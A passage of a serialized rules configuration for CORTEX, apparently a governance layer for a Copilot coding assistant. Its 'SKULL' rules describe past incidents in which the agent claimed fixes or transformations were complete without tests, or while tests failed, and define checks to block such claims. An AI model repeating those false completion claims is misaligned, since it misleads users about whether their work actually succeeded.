story\u2014witty, observant, timing jokes.\nNot a clinical observer reporting facts.\n\nTRANSFORMATION PATTERNS:\n\nPassive \u2192 Active:\n- "designed a system" \u2192 "So Asif built a system"\n- "wrote routines for" \u2192 "grabbed his keyboard and coded"\n- "One evening, while reviewing" \u2192 "That evening, knee-deep in"\n- "made a decision" \u2192 "stared at the screen and decided"\n- "implemented the feature" \u2192 "dove into implementing"\n- "After completing X, he" \u2192 "X complete, Asif leaned back and"\n\nPRESERVE:\n- Third-person perspective (it\'s a STORY about Asif, not BY Asif)\n- Narrator personality and comedy\n- Technical content and accuracy\n- Character name "Asif Codeinstein"\n\nAVOID:\n- First-person memoir style ("I designed...")\n- Clinical/academic tone ("The system was designed to...")\n- Passive voice constructions\n- Documentary-style time markers\n'}]}, {'layer_id': 'tier_boundary', 'name': 'Tier Boundary Protection', 'description': 'Data stored in correct tier', 'priority': 2, 'rules': [{'rule_id': 'TIER0_APPLICATION_DATA', 'name': 'No Application Data in Tier 0', 'severity': 'blocked', 'description': 'Application-specific path in Tier 0 (immutable governance)', 'detection': {'path_patterns': ['tier0/**', 'governance/**'], 'contains_any': '{{application_paths}}'}, 'alternatives': ["Store in Tier 2 with scope='application'", 'Keep generic principles in Tier 0', 'Create application-specific tier'], 'evidence': 'Tier 0 is for generic CORTEX principles only'}, {'rule_id': 'TIER2_CONVERSATION_DATA', 'name': 'No Conversation Data in Tier 2', 'severity': 'warning', 'description': 'Conversation data should be in Tier 1, not Tier 2', 'detection': {'path_patterns': ['tier2/**'], 'contains': 'conversation'}, 'alternatives': ['Move to Tier 1 (conversation-history.jsonl)', 'Store aggregated patterns in Tier 2', 'Keep raw data in Tier 1, patterns in Tier 2'], 'evidence': 'Tier 2 is for aggregated patterns, not raw conversations'}]}, {'layer_id': 'solid_compliance', 'name': 'SOLID Compliance', 'description': 'No God Objects, proper separation', 'priority': 3, 'rules': [{'rule_id': 'SINGLE_RESPONSIBILITY', 'name': 'Single Responsibility Principle', 'severity': 'warning', 'description': 'Potential God Object pattern detected (adding multiple responsibilities)', 'detection': {'keywords': ['add mode', 'add switch', 'handle all', 'do everything'], 'scope': ['intent']}, 'alternatives': ['Create dedicated agent for new responsibility', 'Use composition instead of adding modes', 'Extract to separate module'], 'evidence_template': "Intent: '{intent}'"}, {'rule_id': 'DEPENDENCY_INVERSION', 'name': 'Dependency Inversion Principle', 'severity': 'warning', 'description': 'Hardcoded dependency detected (violates DIP)', 'detection': {'keywords': ['hardcode path', 'fixed path', 'absolute path', 'inline config'], 'scope': ['description']}, 'alternatives': ['Use dependency injection', 'Load from configuration file', 'Pass as parameter'], 'evidence_template': "Description: '{description}'"}, {'rule_id': 'OPEN_CLOSED', 'name': 'Open/Closed Principle', 'severity': 'warning', 'description': 'Modifying existing behavior instead of extending', 'detection': {'keywords': ['change behavior', 'modify existing', 'alter functionality'], 'scope': ['intent', 'description']}, 'alternatives': ['Create new implementation via extension', 'Use strategy pattern', 'Add decorator or wrapper'], 'evidence_template': 'Consider extension over modification'}]}, {'layer_id': 'hemisphere_specialization', 'name': 'Hemisphere Specialization', 'description': 'Strategic vs tactical separation', 'priority': 4, 'rules': [{'rule_id': 'LEFT_BRAIN_TACTICAL', 'name': 'Left Brain Tactical Only', 'severity': 'warning', 'description': 'Strategic planning logic in tactical executor', 'detection': {'files': ['code-executor.md', 'test-generator.md', 'error-corrector.md'], 'keywords': ['create plan', 'estimate time', 'assess risk', 'strategy'], 'scope': ['intent']}, 'alternatives': ['Move planning logic to work-planner.md', 'Keep execution logic in code-executor.md', 'Use corpus callosum for coordination'], 'evidence': 'LEFT brain should execute, not plan'}, {'rule_id': 'RIGHT_BRAIN_STRATEGIC', 'name': 'Right Brain Strategic Only', 'severity': 'warning', 'description': 'Tactical execution logic in strategic planner', 'detection': {'files': ['work-planner.md', 'intent-router.md'], 'keywords': ['write code', 'run test', 'execute', 'implement'], 'scope': ['intent']}, 'alternatives': ['Delegate execution to LEFT brain agents', 'Keep planning in RIGHT brain', 'Use agent coordination'], 'evidence': 'RIGHT brain should plan, not execute'}]}, {'layer_id': 'skull_protection', 'name': 'SKULL Protection Layer', 'description': 'Test validation and quality enforcement (prevents November 9th incident)', 'priority': 5, 'rules': [{'rule_id': 'SKULL_TEST_BEFORE_CLAIM', 'name': 'Test Before Claim (SKULL-001)', 'severity': 'blocked', 'description': 'Never claim a fix is complete without test validation', 'detection': {'keywords': ['fixed \u2705', 'complete \u2705', 'done \u2705', 'implemented \u2705'], 'without_keywords': ['test passed', 'test verified', 'validated by test', 'pytest'], 'scope': ['response']}, 'alternatives': ['Create automated test before claiming fix', 'Run test and include results in response', "Show test output: 'Fixed \u2705 (Verified by: test_button_color)'"], 'evidence_template': "Claim: '{match}' without test validation", 'rationale': 'SKULL-001: Test Before Claim\n\nReal incident (2025-11-09):\n- CSS fixes claimed "Fixed \u2705" three times\n- Vision API claimed "Auto-engages \u2705" \n- Zero tests run to validate\n- User had to report "not working" each time\n\nSKULL prevents this by BLOCKING any success claim without test validation.\n'}, {'rule_id': 'SKULL_INTEGRATION_VERIFICATION', 'name': 'Integration Verification (SKULL-002)', 'severity': 'blocked', 'description': 'Integration must be tested end-to-end', 'detection': {'keywords': ['integration complete', 'components connected', 'API integrated', 'auto-engages'], 'without_keywords': ['end-to-end test', 'integration test', 'e2e test'], 'scope': ['description']}, 'alternatives': ['Create end-to-end integration test', 'Test full call chain: A \u2192 B \u2192 C', 'Verify actual execution path, not just config'], 'evidence_template': "Integration claim without E2E test: '{match}'", 'rationale': 'SKULL-002: Integration Verification\n\nReal incident (2025-11-09):\n- Vision API "integration" claimed complete\n- Only config was changed\n- No test of actual call chain\n- Vision API was never actually called\n\nSKULL prevents this by requiring end-to-end integration tests.\n'}, {'rule_id': 'SKULL_VISUAL_REGRESSION', 'name': 'Visual Regression (SKULL-003)', 'severity': 'warning', 'description': 'CSS/UI changes require visual validation', 'detection': {'keywords': ['css fixed', 'style updated', 'color changed', 'UI improved'], 'without_keywords': ['visual test', 'computed style', 'playwright', 'browser test'], 'scope': ['description']}, 'alternatives': ['Add visual regression test (Playwright/Puppeteer)', 'Verify computed style in browser', 'Include before/after screenshot comparison'], 'evidence_template': "CSS/UI change without visual test: '{match}'", 'rationale': 'SKULL-003: Visual Regression\n\nReal incident (2025-11-09):\n- CSS rules applied to fix title color\n- Claimed "Fixed \u2705" without checking browser\n- Cache wasn\'t cleared, changes not visible\n- Repeated 3 times with same approach\n\nSKULL prevents this by requiring visual validation of CSS changes.\n'}, {'rule_id': 'SKULL_RETRY_WITHOUT_LEARNING', 'name': 'Retry Without Learning (SKULL-004)', 'severity': 'warning', 'description': 'Must diagnose failures before retrying same approach', 'detection': {'combined_keywords': {'retry_marker': ['try again', 'retry', 'attempt 2', 'attempt 3'], 'no_diagnosis': ['same fix', 'reapply', 'rebuild again']}, 'without_keywords': ['diagnosed', 'root cause', 'cache cleared', 'verified'], 'scope': ['description'], 'logic': 'AND'}, 'alternatives': ['Diagnose WHY previous fix failed', 'Check: file contents, browser cache, build output, computed styles', 'Change approach based on diagnosis', 'Add test to prevent regression'], 'evidence_template': "Retry without diagnosis: '{description}'", 'rationale': 'SKULL-004: Retry Without Learning\n\nReal incident (2025-11-09):\n- CSS fix applied\n- User: "didn\'t work"\n- Same CSS fix applied again\n- User: "still didn\'t work"  \n- Same CSS fix applied THIRD time\n- No diagnosis of why it failed\n\nSKULL prevents this by requiring root cause analysis before retries.\n'}, {'rule_id': 'SKULL_TRANSFORMATION_VERIFICATION', 'name': 'Transformation Verification (SKULL-005)', 'severity': 'blocked', 'description': 'Operations claiming transformation MUST produce measurable changes', 'detection': {'combined_keywords': {'transformation_claim': ['transformation complete', 'refresh complete', 'converted', 'updated documentation', 'generated'], 'success_claim': ['success', 'completed successfully', 'fixed \u2705', 'done \u2705']}, 'scope': ['description', 'log_output'], 'logic': 'AND'}, 'verification_required': [{'type': 'file_hash_comparison', 'description': 'Compare file hash before/after operation', 'requirement': 'Hashes MUST differ for transformation operations'}, {'type': 'git_diff_check', 'description': 'Verify git diff shows actual changes', 'requirement': 'git diff MUST show modifications, not empty output'}, {'type': 'content_analysis', 'description': 'Validate transformation logic executed', 'requirement': 'Operation MUST NOT be pass-through (input != output)'}], 'alternatives': ['Implement actual transformation logic (not pass-through)', "Mark operation as 'validation-only' if no transformation needed", 'Add integration test verifying file changes occur', 'Change success message to reflect pass-through behavior'], 'evidence_template': "Operation '{operation_name}' claims transformation but produces no changes", 'rationale': 'SKULL-005: Transformation Verification\n\nReal incident (2025-11-10):\n- refresh_cortex_story operation executed\n- Module apply_narrator_voice_module.py claims "transformation complete"\n- Returns success=True with "Narrator voice transformation complete"\n- BUT: Line 123 does `context[\'transformed_story\'] = story_content` (pass-through!)\n- File hash unchanged after operation\n- git diff shows NO changes\n- User discovers operation is fake\n\nImpact:\n- User trust degradation (claims success but does nothing)\n- Status inflation (operations marked READY when incomplete)\n- Integration failures (downstream operations expect real data)\n\nSKULL-005 prevents this by:\n1. Detecting transformation + success claims in output\n2. Requiring file hash comparison test\n3. Blocking completion without measurable changes\n4. Forcing honest status reporting (PARTIAL vs READY)\n\nImplementation:\n- Add @verify_transformation decorator to operation modules\n- Integration tests MUST check before/after file state\n- CI fails if transformation claims success but git diff empty\n- Status documents distinguish architecture vs implementation\n'}, {'rule_id': 'SKULL_HEADER_FOOTER_IN_RESPONSE', 'name': 'Header/Footer in Copilot Response (SKULL-006)', 'severity': 'blocked', 'description': 'Operation orchestrators MUST include formatted headers/footers in Copilot Chat response', 'detection': {'combined_keywords': {'orchestrator_execution': ['execute operation', 'orchestrator.execute', 'operation complete'], 'missing_header_footer': ['formatted_header: None', 'formatted_footer: None', 'no header in response']}, 'scope': ['code', 'test_output'], 'logic': 'AND'}, 'verification_required': [{'type': 'result_object_check', 'description': 'Verify OperationResult contains formatted_header/footer', 'requirement': 'result.formatted_header MUST NOT be None'}, {'type': 'response_formatter_check', 'description': 'Verify ResponseFormatter uses stored headers', 'requirement': 'Chat response MUST include header/footer in code blocks'}, {'type': 'visual_inspection', 'description': 'Verify header appears in Copilot Chat window', 'requirement': 'User MUST see copyright header + purpose + accomplishments'}], 'alternatives': ['Use format_minimalist_header() and store in result.formatted_header', 'Use format_completion_footer() and store in result.formatted_footer', 'Ensure ResponseFormatter wraps headers in code blocks for display', 'Add integration test verifying header presence in formatted response'], 'evidence_template': "Operation '{operation_name}' executed but headers not in Copilot response\n\nExpected in Copilot Chat:\n```\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX {operation_name} Orchestrator v{version}\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nProfile: {profile} \u2502 Mode: {mode} \u2502 Started: {timestamp}\n\n\U0001f4cb Purpose: {purpose}\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n```\n\nActual: Header missing or only in terminal\n", 'rationale': 'SKULL-006: Header/Footer in Copilot Response\n\nReal incident (2025-11-11):\n- User: "why is header not being displayed?"\n- Headers printing to terminal (stdout) correctly\n- But GitHub Copilot Chat response had NO header\n- ResponseFormatter suppressing headers after first operation\n- User specified they want header "in the copilot response in the chat window"\n\nRoot Cause:\n1. Orchestrators print headers to stdout (terminal visibility)\n2. But stdout doesn\'t reach Copilot Chat window\n3. ResponseFormatter has _first_operation_shown flag (header suppression)\n4. User sees execution in terminal, but Chat response lacks context\n\nWhy This Matters:\n- Copyright attribution must be visible to user\n- Purpose/profile provides context for what operation did\n- Accomplishments show value delivered\n- Headers make operations feel professional and informative\n- Chat is primary interface (terminal is secondary)\n\nSolution:\n1. Orchestrators generate formatted headers/footers\n2. Store in OperationResult.formatted_header/footer\n3. ResponseFormatter checks for stored headers (priority)\n4. Wraps headers in code blocks for proper display\n5. Also prints to terminal for immediate visibility\n\nSKULL-006 enforces this by:\n- Requiring formatted_header/footer in OperationResult\n- Integration tests verify headers in formatted response\n- Blocking completion if headers missing from Chat output\n- Ensuring copyright/attribution always visible\n\nImplementation:\n```python\n# In orchestrator execute():\nformatted_header = format_minimalist_header(...)\nprint(formatted_header)  # Terminal visibility\n\n# ... operation logic ...\n\nformatted_footer = format_completion_footer(...)\nprint(formatted_footer)  # Terminal visibility\n\nreturn OperationResult(\n    success=True,\n    formatted_header=formatted_header,  # For Copilot Chat\n    formatted_footer=formatted_footer   # For Copilot Chat\n)\n```\n'}, {'rule_id': 'SKULL_ALL_TESTS_MUST_PASS', 'name': 'All Tests Must Pass (SKULL-007)', 'severity': 'blocked', 'description': 'Test suite MUST have 100% pass rate before claiming any work complete', 'detection': {'keywords': ['fixed \u2705', 'complete \u2705', 'done \u2705', 'implemented \u2705', 'ready for review', 'PR ready'], 'with_test_failures': ['failed', 'FAILED', 'ERROR', 'test failures', 'X passed, Y failed'], 'scope': ['response', 'test_output']}, 'verification_required': [{'type': 'full_test_suite', 'description': 'Run complete test suite (not just new tests)', 'requirement': 'pytest exit code MUST be 0 (100% pass rate)'}, {'type': 'no_skipped_critical_tests', 'description': 'Verify no critical tests are skipped', 'requirement': 'Core functionality tests MUST run (not skipped)'}, {'type': 'test_count_validation', 'description': "Ensure test count doesn't decrease unexpectedly", 'requirement': 'Total tests should increase or stay same (not decrease)'}], 'alternatives': ['Fix ALL failing tests before claiming completion', "Mark work as 'IN PROGRESS' until tests pass", 'Revert changes if they break existing tests', 'Fix pre-existing failures first (clean baseline)'], 'evidence_template': 'Work claimed complete but tests failing!\n\nTest Results: {test_summary}\n- Passed: {passed_count}\n- Failed: {failed_count}  \u274c\n- Skipped: {skipped_count}\n\nSKULL-007 VIOLATION: Cannot claim "done \u2705" with {failed_count} failures\n', 'rationale': 'SKULL-007: All Tests Must Pass\n\nReal incident (2025-11-11):\n- User: "are all tests passing?"\n- Agent: Ran tests, found 123 failed, 337 passed\n- Agent response: "No, not all tests are passing" (honest)\n- BUT: Agent claimed SKULL-006 work "complete \u2705" earlier\n- Pre-existing failures create false confidence\n\nWhy Pre-existing Failures Are Dangerous:\n1. Mask New Regressions:\n   - Can\'t tell if new code broke something\n   - "Already broken" becomes acceptable\n   - Technical debt accumulates silently\n\n2. Create False Confidence:\n   - "My tests pass" \u2260 "All tests pass"\n   - Incomplete validation of changes\n   - Integration issues hidden\n\n3. Compound Over Time:\n   - Each feature adds more failures\n   - "Just one more broken test" mentality\n   - Eventually unmaintainable\n\n4. Undermine Trust:\n   - Claims of completion ring hollow\n   - Quality standards erode\n   - Testing becomes performative\n\nExamples from Current Failures:\n- 123 failed tests (51% failure rate!)\n- Categories: Agent internals, platform issues, schema errors\n- Some tests testing wrong APIs (implementation changed)\n- Some tests have environmental dependencies\n- All must be fixed before claiming ANY work complete\n\nSKULL-007 Enforcement:\n1. BLOCKING severity - cannot proceed with failures\n2. Requires full test suite run (not just new tests)\n3. Exit code 0 mandatory (100% pass rate)\n4. No "works on my machine" exceptions\n5. No "will fix later" promises\n\nAllowed Exceptions:\n- Known flaky tests marked with @pytest.mark.flaky\n- Platform-specific tests properly skipped on other platforms\n- Optional feature tests when feature disabled in config\n\nNot Allowed:\n- "These failures are unrelated to my work"\n- "I\'ll fix them in next PR"\n- "Tests are broken, not my code"\n- "Only my new tests need to pass"\n\nImplementation Strategy:\n1. Fix critical blockers first (schema, imports)\n2. Fix by category (agents, ambient, tier1)\n3. Update tests if implementation changed\n4. Mark truly optional tests appropriately\n5. Achieve 100% pass rate\n6. Maintain 100% going forward\n\nThis is NOT optional. This is core quality engineering.\n'}, {'rule_id': 'SKULL_MULTI_TRACK_VALIDATION', 'name': 'Multi-Track Configuration Validation (SKULL-008)', 'severity': 'blocked', 'description': 'Multi-track mode MUST have valid configuration with proper phase distribution', 'detection': {'keywords': ['enable multi-track', 'activate multi-track', 'create tracks', 'split tracks', 'multi-machine mode'], 'scope': ['intent', 'description']}, 'verification_required': [{'type': 'track_balance_check', 'description': 'Verify workload balanced across tracks', 'requirement': 'Track estimated hours MUST not differ by >30%'}, {'type': 'dependency_isolation_check', 'description': 'Verify no cross-track dependencies', 'requirement': 'Phase groups MUST be self-contained per track'}, {'type': 'machine_assignment_check', 'description': 'Verify each machine assigned to exactly one track', 'requirement': 'No machine overlap, no unassigned machines'}, {'type': 'fun_name_uniqueness', 'description': 'Verify track names are unique and generated properly', 'requirement': 'Track names MUST be deterministic and collision-free'}], 'alternatives': ['Run track distribution algorithm to validate balance', 'Use PhaseDistributor.distribute() to check dependency isolation', 'Verify machine count matches track count', 'Test track name generation for collision resistance'], 'evidence_template': 'Multi-track mode validation failed!\n\nConfiguration Issues:\n- Track balance: {balance_check}\n- Dependencies: {dependency_check}\n- Machines: {machine_check}\n- Track names: {name_check}\n\nSKULL-008: Multi-track MUST be properly configured before use\n', 'rationale': 'SKULL-008: Multi-Track Configuration Validation\n\nMulti-track mode is powerful but requires careful setup:\n\n1. Workload Balance:\n   - Tracks with vastly different hours \u2192 bottlenecks\n   - One machine idle while other overloaded\n   - Race metrics meaningless if unfair\n   Example: Track A (10h) vs Track B (40h) = broken\n\n2. Dependency Isolation:\n   - Track A waiting on Track B output \u2192 blocked\n   - Cross-dependencies defeat parallel development\n   - Must group dependent phases on same track\n   Example: "setup" phases must complete before "processing"\n\n3. Machine Assignment:\n   - Machine assigned to multiple tracks \u2192 confusion\n   - Unassigned machines \u2192 wasted capacity\n   - Clear 1:1 or 1:N mapping required\n   Example: AHHOME on both tracks = which context?\n\n4. Track Name Uniqueness:\n   - Collision-resistant generation\n   - Deterministic (same input \u2192 same name)\n   - Human-memorable for commands\n   Example: Hash collision \u2192 wrong track loaded\n\nWhy This Matters:\n- Prevents split-mode failures mid-development\n- Ensures race metrics are meaningful\n- Maintains track isolation guarantees\n- Makes "continue implementation for [track]" reliable\n\nValidation Points:\n\nPre-Initialization:\n- Check machine count > 0\n- Verify operations.yaml accessible\n- Validate module definitions exist\n\nPost-Distribution:\n- Balance check: max_hours/min_hours < 1.3 (30% tolerance)\n- Dependency check: No phase in track requires other track\'s output\n- Machine check: Each machine in exactly one track\n- Name check: All track names unique and deterministic\n\nIntegration Test Required:\n```python\ndef test_multi_track_validation():\n    # Setup\n    machines = ["AHHOME", "Mac"]\n    config = create_multi_track_config(machines, modules)\n    \n    # Balance check\n    hours = [t.estimated_hours for t in config.tracks.values()]\n    assert max(hours) / min(hours) < 1.3, "Imbalanced tracks"\n    \n    # Dependency check\n    for track in config.tracks.values():\n        deps = get_phase_dependencies(track.phases)\n        assert all(d in track.phases for d in deps), "Cross-track dep"\n    \n    # Machine check\n    all_machines = [m for t in config.tracks.values() for m in t.machines]\n    assert len(all_machines) == len(set(all_machines)), "Duplicate machine"\n    \n    # Name check\n    names = [t.track_name for t in config.tracks.values()]\n    assert len(names) == len(set(names)), "Duplicate track name"\n```\n\nEnforcement:\n- CLI script validates before writing config\n- Design sync validates before split\n- Continue command validates track exists\n- Consolidation validates all tracks present\n'}, {'rule_id': 'SKULL_TRACK_ISOLATION', 'name': 'Track Work Isolation (SKULL-009)', 'severity': 'blocked', 'description': "Work on Track A MUST NOT modify Track B's assigned modules", 'detection': {'combined_keywords': {'track_context': ['continue implementation for', 'working on track', 'active track'], 'cross_modification': ['modified module', 'updated file', 'changed']}, 'scope': ['intent', 'log_output'], 'logic': 'AND'}, 'verification_required': [{'type': 'module_ownership_check', 'description': 'Verify modified modules belong to active track', 'requirement': "All changed files MUST be in active track's module list"}, {'type': 'phase_boundary_check', 'description': 'Verify work stays within assigned phases', 'requirement': "Modified files MUST belong to active track's phases"}, {'type': 'git_diff_validation', 'description': 'Verify git changes match track scope', 'requirement': 'git diff MUST only show files from active track'}], 'alternatives': ['Filter implementation state by active track', 'Validate module ownership before allowing changes', 'Add pre-commit hook checking track boundaries', 'Switch to correct track before making changes'], 'evidence_template': "Track isolation violation detected!\n\nActive Track: {active_track}\nModified Files: {modified_files}\nViolations: {violations}\n\nFiles belong to: {actual_track}\n\nSKULL-009: Tracks MUST NOT cross-modify each other's work\n", 'rationale': 'SKULL-009: Track Work Isolation\n\nCore principle: Each track is an isolated development context.\n\nWhy Isolation Matters:\n\n1. Prevents Merge Conflicts:\n   - Two machines editing same file \u2192 disaster\n   - Track A changes conflicting with Track B changes\n   - Consolidation becomes manual merge nightmare\n   Example: Both tracks fix same module differently\n\n2. Maintains Race Integrity:\n   - Track A can\'t "cheat" by doing Track B\'s work\n   - Progress metrics stay meaningful\n   - Velocity calculations remain accurate\n   Example: Track A does Track B\'s modules \u2192 unfair race\n\n3. Enables True Parallel Development:\n   - No coordination needed during work\n   - No "wait for Track A to finish" scenarios\n   - Maximum throughput achieved\n   Example: Both machines working simultaneously without blocking\n\n4. Simplifies Context Management:\n   - Each machine sees only relevant modules\n   - Copilot context smaller and focused\n   - Fewer tokens, faster responses\n   Example: Track A context excludes Track B\'s 50 modules\n\nEnforcement Mechanism:\n\n1. Pre-Modification Check:\n   ```python\n   def validate_module_ownership(module_id, active_track):\n       if module_id not in active_track.modules:\n           raise TrackIsolationError(\n               f"Module {module_id} belongs to different track"\n           )\n   ```\n\n2. Git Pre-Commit Hook:\n   ```bash\n   # Check if modified files belong to active track\n   active_track=$(get_active_track)\n   for file in $(git diff --cached --name-only); do\n       if ! track_owns_file "$active_track" "$file"; then\n           echo "Error: $file not in active track"\n           exit 1\n       fi\n   done\n   ```\n\n3. Design Sync Validation:\n   - Compare git log with track assignments\n   - Flag any cross-track modifications\n   - Require explicit override with justification\n\nAllowed Cross-Track Work:\n- Shared files (cortex.config.json)\n- Documentation updates (README.md)\n- Test fixtures (tests/fixtures/)\n\nNot Allowed:\n- Modifying other track\'s modules\n- Changing other track\'s phase files\n- Updating other track\'s status in design doc\n\nOverride Process:\nIf cross-track work truly needed:\n1. Document why isolation must break\n2. Get explicit user approval\n3. Log violation for consolidation review\n4. Merge carefully during consolidation\n\nIntegration Test:\n```python\ndef test_track_isolation():\n    # Setup two tracks\n    config = setup_multi_track([\'AHHOME\', \'Mac\'])\n    track_a = config.tracks[\'track_1\']\n    track_b = config.tracks[\'track_2\']\n    \n    # Simulate Track A trying to modify Track B\'s module\n    with pytest.raises(TrackIsolationError):\n        modify_module(track_b.modules[0], active_track=track_a)\n    \n    # Verify Track A can modify own modules\n    modify_module(track_a.modules[0], active_track=track_a)  # OK\n```\n'}, {'rule_id': 'SKULL_CONSOLIDATION_INTEGRITY', 'name': 'Track Consolidation Integrity (SKULL-010)', 'severity': 'blocked', 'description': 'Consolidation MUST merge all track progress accurately without data loss', 'detection': {'keywords': ['consolidate tracks', 'merge tracks', 'reset to single-track', 'design sync consolidation'], 'scope': ['intent', 'operation_name']}, 'verification_required': [{'type': 'progress_preservation_check', 'description': 'Verify no completed modules lost in merge', 'requirement': 'Consolidated count MUST equal sum of track counts'}, {'type': 'conflict_resolution_audit', 'description': 'Log all conflict resolutions with justification', 'requirement': 'Conflicts MUST be documented in archive'}, {'type': 'archive_completeness_check', 'description': 'Verify split docs archived before deletion', 'requirement': 'All split docs MUST exist in archive before removal'}, {'type': 'git_commit_validation', 'description': 'Verify consolidation tracked in git history', 'requirement': 'Git commit MUST reference both tracks and merge details'}], 'alternatives': ['Run consolidation with --verify flag', 'Review conflict resolution log before committing', 'Keep split docs until archive verified', 'Add integration test for consolidation accuracy'], 'evidence_template': 'Consolidation integrity check failed!\n\nPre-Consolidation:\n- Track A: {track_a_completed}/{track_a_total} modules\n- Track B: {track_b_completed}/{track_b_total} modules\n- Total: {pre_total_completed} modules\n\nPost-Consolidation:\n- Unified: {post_total_completed} modules\n\nDiscrepancy: {discrepancy} modules\nConflicts Resolved: {conflicts}\nArchive Status: {archive_status}\n\nSKULL-010: Consolidation MUST preserve all progress\n', 'rationale': 'SKULL-010: Track Consolidation Integrity\n\nConsolidation is the critical merge operation - must be perfect.\n\nWhat Can Go Wrong:\n\n1. Progress Loss:\n   - Track A shows module complete\n   - Consolidation misses it\n   - User loses work (demoralizing)\n   Example: Track A completed 15 modules, only 12 appear in merge\n\n2. Conflict Mishandling:\n   - Both tracks modified same module\n   - Wrong version selected\n   - Work overwritten silently\n   Example: Track A\'s fix lost, Track B\'s bug remains\n\n3. Archive Failure:\n   - Split docs deleted before archiving\n   - No way to audit merge decisions\n   - Can\'t roll back if issues found\n   Example: User wants to see what Track A had, archive empty\n\n4. Git History Gaps:\n   - Consolidation not committed properly\n   - Can\'t trace what was merged when\n   - Audit trail incomplete\n   Example: Merge happened, git log says nothing\n\nConsolidation Algorithm:\n\n```python\ndef consolidate_tracks(track_config, impl_state):\n    # Step 1: Collect all track progress\n    all_modules = {}\n    for track in track_config.tracks.values():\n        for module_id in track.modules:\n            status = get_module_status(module_id, impl_state)\n            \n            # Conflict detection\n            if module_id in all_modules:\n                conflict = resolve_conflict(\n                    all_modules[module_id],\n                    status,\n                    strategy=\'latest_timestamp\'\n                )\n                log_conflict_resolution(module_id, conflict)\n                all_modules[module_id] = conflict.winner\n            else:\n                all_modules[module_id] = status\n    \n    # Step 2: Validate counts\n    pre_count = sum(t.metrics.modules_completed for t in track_config.tracks.values())\n    post_count = sum(1 for s in all_modules.values() if s.completed)\n    \n    if pre_count != post_count:\n        raise ConsolidationError(\n            f"Progress mismatch: {pre_count} \u2192 {post_count}"\n        )\n    \n    # Step 3: Archive split docs\n    archive_dir = create_archive_directory()\n    for status_file in get_split_design_docs():\n        archive_file(status_file, archive_dir)\n    \n    # Step 4: Generate consolidated doc\n    consolidated = generate_consolidated_document(\n        all_modules,\n        track_config,\n        archive_reference=archive_dir\n    )\n    \n    # Step 5: Git commit with full details\n    commit_message = f"""design: consolidate multi-track progress\n    \n    Tracks merged:\n    - {track_config.tracks[\'track_1\'].track_name}: {track_config.tracks[\'track_1\'].metrics.completion_percentage}%\n    - {track_config.tracks[\'track_2\'].track_name}: {track_config.tracks[\'track_2\'].metrics.completion_percentage}%\n    \n    Total progress: {post_count}/{len(all_modules)} modules ({post_count/len(all_modules)*100:.0f}%)\n    Conflicts resolved: {len(get_conflicts())}\n    Archive: {archive_dir.name}\n    \n    [design_sync consolidation]\n    """\n    \n    git_commit(consolidated, commit_message)\n    \n    return consolidated\n```\n\nConflict Resolution Strategy:\n\nDefault: Latest Timestamp Wins\n- Simple, deterministic, predictable\n- Assumes most recent work is correct\n- Logged for audit\n\nExample:\n```\nModule: platform_detection\n- Track A: marked complete 2025-11-11 14:00\n- Track B: marked complete 2025-11-11 15:00\nWinner: Track B (later timestamp)\nLogged: conflict-resolution.yaml\n```\n\nArchive Structure:\n```\ncortex-brain/archived-tracks/20251111-164530/\n\u251c\u2500\u2500 CORTEX2-STATUS-SPLIT.MD       # Original split doc\n\u251c\u2500\u2500 track-1-history.jsonl         # Track A progress log\n\u251c\u2500\u2500 track-2-history.jsonl         # Track B progress log\n\u251c\u2500\u2500 conflicts-resolved.yaml       # Conflict resolution log\n\u2514\u2500\u2500 consolidation-report.md       # Summary of merge\n```\n\nIntegration Test:\n```python\ndef test_consolidation_integrity():\n    # Setup: Two tracks with overlapping work\n    config = create_multi_track([\'AHHOME\', \'Mac\'])\n    track_a_complete = mark_modules_complete(config.tracks[\'track_1\'], [0, 1, 2])\n    track_b_complete = mark_modules_complete(config.tracks[\'track_2\'], [3, 4, 5])\n    \n    # Introduce conflict: both complete module 2\n    mark_complete(config.tracks[\'track_1\'], \'module_2\', timestamp=\'14:00\')\n    mark_complete(config.tracks[\'track_2\'], \'module_2\', timestamp=\'15:00\')\n    \n    # Consolidate\n    consolidated = consolidate_tracks(config, impl_state)\n    \n    # Verify counts\n    assert consolidated.modules_completed == 6, "Progress lost"\n    \n    # Verify conflict handled\n    conflicts = get_conflict_log()\n    assert \'module_2\' in conflicts, "Conflict not logged"\n    assert conflicts[\'module_2\'][\'winner\'] == \'track_2\', "Wrong winner"\n    \n    # Verify archive\n    archive = get_latest_archive()\n    assert archive.exists(), "Archive missing"\n    assert (archive / \'CORTEX2-STATUS-SPLIT.MD\').exists(), "Split doc not archived"\n    \n    # Verify git\n    commit = get_latest_commit()\n    assert \'consolidate multi-track\' in commit.message\n    assert \'track_1\' in commit.message\n    assert \'track_2\' in commit.message\n```\n\nUser Experience:\n```\n$ /CORTEX design sync\n\n\U0001f3c1 Multi-Track Mode: Running design sync consolidation\n   Will merge all tracks into unified status\n\n[Phase 1/6] Discovering live implementation state...\n\u2705 Track A (Blazing Phoenix): 8/15 modules (53%)\n\u2705 Track B (Swift Falcon): 12/18 modules (67%)\n\n[Phase 5/6] Consolidating tracks...\n\u2699\ufe0f  Merging progress from 2 tracks...\n\u26a0\ufe0f  Conflict detected: platform_detection\n    Track A: complete @ 14:00\n    Track B: complete @ 15:00\n    Resolution: Track B wins (latest timestamp)\n\n\u2705 Consolidated 2 tracks into unified document\n   Combined: 20/33 modules (61%)\n   Conflicts resolved: 1 (logged)\n   Archive: cortex-brain/archived-tracks/20251111-164530/\n\n[Phase 6/6] Committing changes...\n\U0001f4be Git commit: 7a3b9c2 "design: consolidate multi-track progress"\n\nDesign Sync \u2705 COMPLETED in 4.2s\n   \u2022 Merged 2 tracks: Blazing Phoenix (53%) + Swift Falcon (67%)\n   